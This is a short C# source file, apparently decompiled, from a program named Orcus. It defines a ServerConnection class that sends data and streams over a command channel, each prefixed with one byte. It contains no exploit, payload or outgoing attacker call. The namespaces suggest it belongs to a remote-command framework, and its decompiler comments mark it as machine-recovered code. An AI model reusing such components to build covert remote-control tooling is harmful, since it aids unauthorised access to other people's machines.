using System;
using System.IO;
using Orcus.Plugins;
using Orcus.Shared.Data;

namespace Orcus.Commands.ConnectionInitializer;

public class ServerConnection : IDisposable, IConnection
{
	private readonly Command _command;

	private readonly IConnectionInfo _connectionInfo;

	private readonly byte _prefix;

	public bool SupportsStream { get; } = true;


	public ServerConnection(IConnectionInfo connectionInfo, Command command, byte prefix)
	{
		_connectionInfo = connectionInfo;
		_command = command;
		_prefix = prefix;
	}

	public void Dispose()
	{
	}

	public void SendData(byte[] buffer, int offset, int length)
	{
		_connectionInfo.UnsafeResponse(_command, length + 1, (Action<BinaryWriter>)delegate(BinaryWriter writer)
		{
			writer.Write(_prefix);
			writer.Write(buffer, offset, length);
		});
	}

	public void SendStream(WriterCall writerCall)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		_connectionInfo.UnsafeResponse(_command, new WriterCall(writerCall.get_Size() + 1, (Action<Stream>)delegate(Stream stream)
		{
			stream.WriteByte(_prefix);
			writerCall.WriteIntoStream(stream);
		}));
	}
}
